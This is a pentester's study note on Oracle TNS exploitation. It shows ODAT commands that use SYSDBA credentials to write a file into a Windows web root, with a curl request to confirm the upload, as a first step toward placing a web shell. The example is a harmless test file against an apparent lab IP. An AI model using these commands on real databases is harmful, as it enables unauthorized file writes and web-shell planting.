---
id: Exploitation
aliases: []
tags:
  - Networking/Services/Oracle-TNS/Exploitation
---

# Exploitation

<!-- File Upload {{{-->
## File Upload

It may be possible to upload a web shell to the target with
[[Enumeration#ODAT|ODAT]] if

- the server is running a web server
- the server's [[Webapp/General/Web Server Root#Default|root directory location]]
  is known

1. Create a payload

```sh
echo "Oracle File Upload Test" > testing.txt
```

2. Upload the file to the database with [[Enumeration#ODAT|ODAT]]

```sh
./odat.py utlfile -s <target_ip> -d XE -U <use> -P <password> --sysdba --putFile C:\\path\\to <file.ext> ./testing.txt
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
> ```
>
> > [!info]-
> >
> > - `utlfile`: [Oracle UTL_FILE](https://docs.oracle.com/database/121/ARPLS/u_file.htm)
> >   functionality to upload a file
> > - `-s 10.129.204.235`: target IP of the Oracle instance.
> > - `-d XE`: database/SID (Oracle XE).
> > - `-U scott`: username
> > - `-P tiger`: password in cleartext
> > - `--sysdba`: run with SYSDBA privileges
> > - `--putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`:
> >   upload a file to the DB server's filesystem
> >
>
> ```sh
> [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
> [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
> ```
<!-- }}} -->

3. Test if the uppload worked with [cURL](https://curl.se/)

```sh
curl -X GET http://10.129.204.235/testing.txt
```
```sh
Oracle File Upload Test
```

<!-- }}} -->
